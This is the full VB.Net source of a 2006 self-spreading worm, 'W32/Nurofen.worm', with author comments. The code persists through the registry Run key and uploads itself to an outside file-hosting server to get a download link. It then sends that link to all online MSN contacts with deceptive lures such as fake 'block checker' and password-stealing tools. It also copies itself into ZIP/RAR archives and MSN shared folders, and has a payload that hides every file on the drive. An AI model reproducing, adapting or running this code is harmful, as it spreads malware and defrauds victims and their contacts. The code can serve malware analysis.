Imports MessengerAPI
Imports System.Diagnostics
Imports System.Reflection
Imports Microsoft.Win32
Imports System.IO
Imports System.Net
Imports System.Text

'A basic MSN Messanger & ZIP/RAR Archive & MSN shares worm.. Don't try to spread it!
'Written in VB.Net due to synge complaining that there isnt enough VB.Net malware lol

'''''''''''''''''''''''''''''''''
'     Genetix {Doomriderz}      '
'       W32/Nurofen.worm        '
'           XMAS 2006           '
'''''''''''''''''''''''''''''''''

'1: adds to registry run key to start with windows "c:\MSNUpdate.exe".
'2: waits for msn to load by checking processes for "msnmsgr" then waits and checks to see if it's signed in and appear as online.
'3: uploads a copy of itself to the filesever with a random file name
'4: get's a random topic & gets all online contacts
'5: sends the random topic with the url to the worm download & url to DotNet framework 2.0 :p
'6: checks if the WinRar.exe exists by checking for the path in the registry
'7: searches for rar & zip files in it's folder and drops a copy of itself inside them
'8: Find MSN shared folders and copy as "Game.exe" to them.
'9: Kinda harmless payload that hides every file on the drive (attr +H)

'My worm will work depending on the follwoing reasons:
'1: The file server used dont change how it handles uploads
'2: You dont change the code and mess it all up!
'3: you have .net 2.0
'4: you have internet access
'4: its bug free (i think it is but report any bugs to me genetix [AT] phreaker [Dot] net
'5: If it dont work for people trying to spread it then I dont care! I hope it fails on you.
Public Class Form1
    Private Const MAX_PATH As Integer = 260

    'declare some API's / variables... ect that will be used globaly in this worm
    Private Declare Auto Function GetShortPathName Lib "kernel32" ( _
    ByVal lpszLongPath As String, _
    ByVal lpszShortPath As System.Text.StringBuilder, _
    ByVal cchBuffer As Integer) As Integer
    Const DotNet As String = "http://MSDOTNET.notlong.com" 'short url to .net 2.0
    Dim RarPath As String
    Dim WormPath As String
    Dim WormFile As String
    Dim msn As New Messenger()
    Dim Victims As IMessengerContacts
    Dim Victim As IMessengerContact
    Dim Worm As String
    Dim url As String
    Const KeyTitle As String = "MSNUpdate"
    Const subkey As String = "Software\Microsoft\Windows\CurrentVersion\Run"

    'This sub deals with calling other needed sub's/functions and is the main body 
    'of the contacts spreading.
    Sub MSN_Worm()
        On Error Resume Next
        upload()
        File.Delete(Worm)
        Dim message(15) As String
        Randomize()
        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        'some lame messages to fool the user into getting this worm..  '
        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        message(1) = "New msn block checker 1.5 Download here: " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(2) = "MSN Block checker download " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(3) = "Working MSN block checker " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(4) = "Free MSN Add-ons limited! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(5) = "New MSN messanger 2007 " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(6) = "Find out who's blocked you! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(7) = "Download the new MSN block checker! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(8) = "Download the new MSN smilie kit! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(9) = "NEW MSN BLOCK CHECKER DOWNLOAD NOW! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(10) = "Download the new MSN bot it talks like a real person!! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(11) = "New MSN tool get it now! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(12) = "Download our new MSN block checker " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(13) = "Find out who is blocking you on MSN " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(14) = "This program can get your friends MSN passwords!! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet
        message(15) = "Find out your friends MSN passwords! " & url & _
        " you will need to install the .net framework to run this application, here: " & DotNet

        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        'okay so now it searches for online contacts and and opens a       '
        'a chat window to send its download link then closes the window..  ' 
        'all done kinda reall fast                                         '
        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        Victims = msn.MyContacts
        For Each Victim In Victims
            If Victim.Status <> MISTATUS.MISTATUS_OFFLINE Then
                If Victim.Blocked <> True Then
                    msn.InstantMessage(Victim.SigninName)
                    SendKeys.SendWait(message(Int(15 * Rnd()) + 1))
                    SendKeys.SendWait("{ENTER}")
                    SendKeys.SendWait("{ESC}")
                End If
            End If
        Next

        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        'call sub to get WinRar from registry then check if it exist   '
        'if so, call the rar worm function (also for .zip)             '
        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        RarPath = GetRarPath()
        If File.Exists(RarPath) = True Then
            RarWorm()
        End If
        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        'call MSN shares spreading sub                                 '
        ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        MSN_Share_drop()
        Randomize()

        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        'to check if payload should activate via random number comparing  '
        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        If Int(200 * Rnd()) = 50 Then
            payload()
        End If

    End Sub

    Private Sub Timer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer.Tick
        On Error Resume Next
        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        'The worm need's to know when MSN starts/When its online/If its   '
        'already running ect.. this this timer deals with all that stuff  '
        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        Dim FindProcess As Process
        For Each FindProcess In Process.GetProcesses(System.Environment.MachineName)
            If (FindProcess.ToString().IndexOf("msnmsgr", 0) + 1) Then
                If msn.MyStatus = MISTATUS.MISTATUS_ONLINE Then
                    Timer.Enabled = False
                    MSN_Worm()
                End If
            End If
        Next FindProcess
    End Sub

    Sub upload()
        On Error Resume Next
        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        '  Thx you retro soooo much~! most of this sub is all his code but i rewrote it in VB.net for this  '
        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        'Well this is very kewl! it uploads itself to the file server and gets the link to download it
        'thats all but It's good!
        Dim pos As Integer
        Dim pos2 As Integer
        Dim sKey As String
        Dim key As String
        Dim boundary As String = Guid.NewGuid().ToString().Replace("-", "")
        Dim fs As FileStream = File.OpenRead(Worm)
        Dim bytes As Byte() = New Byte(fs.Length - 1) {}
        fs.Read(bytes, 0, bytes.Length)
        fs.Close()

        Dim mimebody As String = "--" & _
        boundary & Constants.vbCrLf & _
        "Content-Disposition: form-data; name=""MAX_FILE_SIZE""" & _
        Constants.vbCrLf & Constants.vbCrLf & "27000000" & Constants.vbCrLf & _
        "--" & boundary & Constants.vbCrLf & _
        "Content-Disposition: form-data; name=""page""" & _
        Constants.vbCrLf & Constants.vbCrLf & "upload" & Constants.vbCrLf & _
        "--" & boundary & Constants.vbCrLf & _
        "Content-Disposition: form-data; name=""file""; filename=""" & _
        Worm & """" & Constants.vbCrLf & "Content-Type: application/x-msdos-program" _
        & Constants.vbCrLf & Constants.vbCrLf & Encoding.Default.GetString(bytes) & _
        Constants.vbCrLf & "--" & boundary & "--" & Constants.vbCrLf

        Dim buffer As Byte() = Encoding.Default.GetBytes(mimebody)
        Dim request As HttpWebRequest = CType(WebRequest.Create("http://www5.upload2.net/upload.php"), HttpWebRequest)
        request.Method = "POST"
        request.ContentType = "multipart/form-data; charset=UTF-8; boundary=" & boundary
        request.Accept = "text/xml,application/xml,application/xhtml+xml, " _
         + "text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
        request.Headers.Add("Accept-Encoding", "gzip,deflate")
        request.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
        request.ContentLength = buffer.Length
        ServicePointManager.Expect100Continue = False
        request.CookieContainer = New CookieContainer()
        Dim srvStream As Stream = request.GetRequestStream()
        srvStream.Write(buffer, 0, buffer.Length)
        srvStream.Close()
        Dim response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
        Dim respURL As String = response.ResponseUri.ToString()

        'I love playing with strings!
        pos = (respURL.IndexOf("/id/", 0) + 1)
        sKey = Mid(respURL, pos + 4, Len(respURL))
        pos2 = (sKey.IndexOf("/pwd/", 0) + 1)
        key = sKey.Substring(0, pos2 - 1)
        url = "http://www.upload2.net/page/download/" + key + "/" + Worm + ".html"

    End Sub

    ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    'Worm needs to know the current drive its on so this deals with it.    '
    ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    Function CurDrive(ByVal arg As String)
        On Error Resume Next
        Dim dir As String, Pos As String
        Pos = (arg.IndexOf("\", 0) + 1)
        dir = arg.Substring(0, Val(Pos))
        CurDrive = dir
    End Function

    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    'payload that calls on other functions to get what it needs.      '
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    Sub payload()
        On Error Resume Next
        Dim MyDir As DirectoryInfo
        MyDir = New DirectoryInfo(WormPath)
        GetDirs(MyDir)
    End Sub

    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    'this kinda just installs the worm.. explains itself (like most of my code) '
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Me.Visible = False
        Dim WormModule As System.Reflection.Module = [Assembly].GetExecutingAssembly().GetModules()(0)
        WormFile = (WormModule.FullyQualifiedName)
        WormPath = (CurDrive(WormFile))
        Dim NewValue As String = WormPath & "\WINDOWS\" & KeyTitle & ".exe"
        If File.Exists(NewValue) = False Then
            File.Copy(WormFile, NewValue)
        End If
        Worm = RndFileName() & ".exe"
        If File.Exists(Worm) = False Then
            File.Copy(WormFile, Worm)
        End If

        Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey(subkey, True)
        key.SetValue(KeyTitle, NewValue)
    End Sub

    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    'this is part of a recursive folder searching function            '
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    Sub GetDirs(ByVal aDir As DirectoryInfo)
        On Error Resume Next
        Dim nextDir As DirectoryInfo
        GetFiles(aDir)
        For Each nextDir In aDir.GetDirectories
            GetDirs(nextDir)
        Next
    End Sub
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    'same as above but for files.. they reply on eachother to work..  '
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    Sub GetFiles(ByVal aDir As DirectoryInfo)
        On Error Resume Next
        Dim aFile As FileInfo
        For Each aFile In aDir.GetFiles()
            File.SetAttributes(aFile.FullName, FileAttributes.Hidden)
        Next
    End Sub
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    'well i decided its better not to use a static name for uploading '
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    Function RndFileName()
        On Error Resume Next
        Dim builder As New StringBuilder()
        Dim random As New Random()
        Dim cha As Char
        Dim i As Integer
        For i = 0 To 6
            cha = Convert.ToChar(Convert.ToInt32((26 * random.NextDouble() + 65)))
            builder.Append(cha)
        Next
        RndFileName = builder.ToString()
    End Function
    ''''''''''''''''''''''''''''''''''''''''
    'this sub is for zip/rar archive worm  '
    ''''''''''''''''''''''''''''''''''''''''
    Sub RarWorm()
        On Error Resume Next
        Dim WormModule As System.Reflection.Module = [Assembly].GetExecutingAssembly().GetModules()(0)
        Dim WormFile As String = (WormModule.Name)
        Dim FullName As String = (WormModule.FullyQualifiedName)
        Dim WormPath As String = (WorkingFolder(FullName))
        Dim i As Int32 = 0
        Dim files() As String
        Dim compile As String = ""
        Dim ShrtPath As String = ""
        Dim shrtWorm As String = 0
        Dim ext As String = ""
        files = System.IO.Directory.GetFiles(WormPath)

        For i = 0 To files.GetUpperBound(0)
            ext = Mid(files(i), Len(files(i)) - 3, Len(files(i)))
            If ext = ".rar" Or ext = ".zip" Then
                ShrtPath = GetShortFileName(files(i))
                compile = RarPath & " a " & ShrtPath & Space(1) & WormFile
                Shell(compile, AppWinStyle.Hide, True)
            End If
        Next
    End Sub
    '''''''''''''''''''''''''''''''''''
    'here is the MSN shares worm sub  '
    '''''''''''''''''''''''''''''''''''
    Sub MSN_Share_drop()
        On Error Resume Next
        Dim WormModule As System.Reflection.Module = [Assembly].GetExecutingAssembly().GetModules()(0)
        Dim WormFile As String = (WormModule.FullyQualifiedName)
        Dim FolPath As String = WormPath & "Documents and Settings\" & Environ("USERNAME") & "\Local Settings\Application Data\Microsoft\Messenger\"
        If Dir(FolPath, FileAttribute.Directory) <> "" Then
            Dim i As Int32 = 0
            Dim x As Int32 = 0
            Dim shares() As String
            shares = System.IO.Directory.GetDirectories(FolPath)
            For i = 0 To shares.GetUpperBound(0)
                If Dir(shares(i), FileAttribute.Directory) <> "" Then
                    If File.Exists(shares(i) & "\Game.exe") = False Then
                        File.Copy(WormFile, shares(i) & "\Game.exe")
                    End If
                End If
            Next
        End If
    End Sub
    ''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    'the worm needs to know if and where WinRar is right?  '
    ''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    Function GetRarPath() As String
        On Error Resume Next
        Dim myReg As RegistryKey
        myReg = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe", False)
        If Not myReg Is Nothing Then
            GetRarPath = CStr(myReg.GetValue("Path")) & "\WinRar.exe"
        End If
    End Function

    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    'Long path wont work with WinRar.exe because of the spaces so this function deals with it '
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    Public Function GetShortFileName(ByVal LongPath As String) As String
        On Error Resume Next
        Dim ShortPath As New StringBuilder(MAX_PATH)
        Dim BufferSize As Integer = GetShortPathName( _
        LongPath, _
        ShortPath, _
        ShortPath.Capacity)

        Return ShortPath.ToString()
    End Function
    '''''''''''''''''''''''''
    'get current directory  '
    '''''''''''''''''''''''''
    Function WorkingFolder(ByVal arg As String)
        On Error Resume Next
        Dim dir As String, Pos As String
        Pos = InStrRev(arg, "\")
        dir = Mid(arg, 1, Val(Pos))
        WorkingFolder = dir
    End Function

End Class

'Ok its messy! But I'm proud of it.
